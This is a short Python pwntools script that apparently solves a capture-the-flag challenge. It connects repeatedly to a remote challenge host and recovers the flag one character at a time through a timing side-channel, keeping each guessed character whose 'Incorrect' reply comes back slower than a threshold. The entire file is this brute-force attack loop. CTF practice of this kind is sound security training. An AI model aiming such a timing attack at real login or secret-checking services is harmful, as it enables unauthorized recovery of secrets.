 
import time
from pwn import *

def main():
    LOCAL = False
    correct = 'uscg{not_this_time}'
    incorrect = 'a' * 10
    current = 63
    while(1):
        try:
            while(current <= 127):
                print("i is: ", current)
                if LOCAL:
                    p = process('./chall.py')
                else:
                    p = remote('0.cloud.chals.io', 15346)
                p.recvuntil('>>> \n')
                guess = correct + chr(current)   
                to_send = guess + incorrect
                p.sendline(to_send)
                print("Sending: ", to_send)
                start = time.time()
                s = p.recvuntil("Incorrect\n")
                end = time.time()
                print("Time diff is:", end - start)
                if (end - start > 0.25 * (len(correct) + 1)):
                    correct += chr(current)
                    print("Flag is: ", correct, chr(current), current)
                    current = 63
                    break
                    
                p.close()
                current += 1
        except: 
            current -= 1
            print("current is: ", current)

if __name__ == '__main__':
    main()
    # uscg{not_this_time}